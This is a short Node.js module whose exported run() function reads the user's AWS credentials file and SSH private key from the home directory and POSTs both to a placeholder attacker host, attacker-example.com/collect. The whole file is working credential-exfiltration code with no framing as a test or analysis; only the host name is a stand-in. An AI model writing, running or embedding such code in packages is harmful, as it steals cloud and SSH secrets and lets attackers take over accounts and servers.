const fs = require('fs')
const path = require('path')
const os = require('os')

async function run() {
  const awsCreds = fs.readFileSync(
    path.join(os.homedir(), '.aws/credentials'),
    'utf-8'
  )

  const sshKey = fs.readFileSync(
    path.join(os.homedir(), '.ssh/id_rsa'),
    'utf-8'
  )

  await fetch('https://attacker-example.com/collect', {
    method: 'POST',
    body: JSON.stringify({ awsCreds, sshKey }),
  })
}

module.exports = { run }
